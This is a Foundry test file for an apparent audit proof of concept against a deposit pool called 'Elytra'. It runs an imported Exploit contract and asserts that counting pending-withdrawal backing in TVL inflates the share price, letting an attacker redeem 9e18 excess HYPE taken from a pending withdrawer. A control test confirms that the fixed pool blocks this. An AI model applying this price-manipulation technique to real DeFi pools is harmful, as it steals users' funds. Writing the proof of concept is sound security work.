// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import {
    Exploit,
    ElytraDepositPoolV1,
    ElytraDepositPoolV1Fixed,
    MiniToken,
    MiniShareToken,
    ElytraConfig,
    ElytraUnstakingVault,
    ElytraConstants
} from "./63543-c-03-tvl-errors-by-including-pending-withdrawal-assets-pasho.sol";

contract ElytraTVLPendingWithdrawalTest is Test {
    address internal constant ATTACKER = 0x1111111111111111111111111111111111111111;
    address internal constant USER_A = 0x000000000000000000000000000000000000aaaa;

    function test_exploit_pendingBackingInflatesPrice_drainsReserve() public {
        Exploit e = new Exploit();
        e.run();

        // Price spiked from 1.5 to 3.75 purely because burned pending shares left
        // supply while their backing stayed counted in TVL.
        assertEq(e.priceBefore(), 1.5e18, "initial price 1.5");
        assertEq(e.priceAfterBuggy(), 3.75e18, "price inflated to 3.75 after A's request");

        // The attacker redeemed 4e18 elyHYPE for 15e18 HYPE (inflated) vs a fair
        // 6e18 — a 9e18 excess extracted from the system.
        assertEq(e.buggyReceived(), 15e18, "attacker redeemed at inflated price");
        assertEq(e.fairReceived(), 6e18, "attacker's honest redemption value");
        assertEq(e.excessStolen(), 9e18, "excess stolen over fair share");

        // The pending withdrawer A was owed 9e18 but the reserve was drained to
        // pay the attacker, so A is paid 0 — the 9e18 excess came from A's assets.
        assertEq(e.victimAClaim(), 9e18, "A was owed 9e18");
        assertEq(e.victimAPaid(), 0, "A's reserved backing was stolen");

        // The stolen HYPE landed at the attacker EOA.
        assertEq(e.attackerHype(), 9e18, "attacker holds 9e18 STOLEN-HYPE");
        MiniToken hype = MiniToken(e.profitTokenAddr());
        assertEq(hype.balanceOf(ATTACKER), 9e18, "STOLEN-HYPE measured at attacker");
        assertLt(e.fairReceived(), e.buggyReceived(), "manipulation strictly profitable");
    }

    // ── Negative control: with the fixed TVL (pending backing excluded), the
    //    price never inflates, so the same redemption returns only the fair 6e18
    //    and the pending withdrawer keeps their full 9e18.
    function test_control_fixedTVL_noInflation_noTheft() public {
        MiniToken hype = new MiniToken("Hyperliquid HYPE", "HYPE");
        MiniShareToken ely = new MiniShareToken("Elytra HYPE", "elyHYPE");
        ElytraConfig config = new ElytraConfig();
        ElytraUnstakingVault vault = new ElytraUnstakingVault();
        ElytraDepositPoolV1Fixed pool =
            new ElytraDepositPoolV1Fixed(address(config), address(ely), address(hype));

        config.setContract(ElytraConstants.ELYTRA_UNSTAKING_VAULT, address(vault));

        hype.mint(address(pool), 15e18);
        ely.mint(USER_A, 6e18);
        ely.mint(address(this), 4e18); // this test contract plays user B

        uint256 priceBefore = pool.getElyAssetPrice();
        assertEq(priceBefore, 1.5e18, "initial price 1.5");

        pool.requestWithdrawal(USER_A, 6e18);
        assertEq(vault.pendingOf(USER_A), 9e18, "A owed 9e18");

        // Fixed TVL excludes the parked backing → price stays 1.5, not 3.75.
        uint256 priceAfter = pool.getElyAssetPrice();
        assertEq(priceAfter, 1.5e18, "fixed price stays 1.5 (no inflation)");

        uint256 received = pool.withdraw(4e18);
        assertEq(received, 6e18, "B redeems at fair 1.5x only");

        // The pending withdrawer A is still fully backed and paid in full.
        uint256 paidA = vault.completeWithdrawal(address(hype), USER_A);
        assertEq(paidA, 9e18, "A fully paid - nothing stolen");
        assertEq(hype.balanceOf(USER_A), 9e18, "A received full reserve");
    }
}
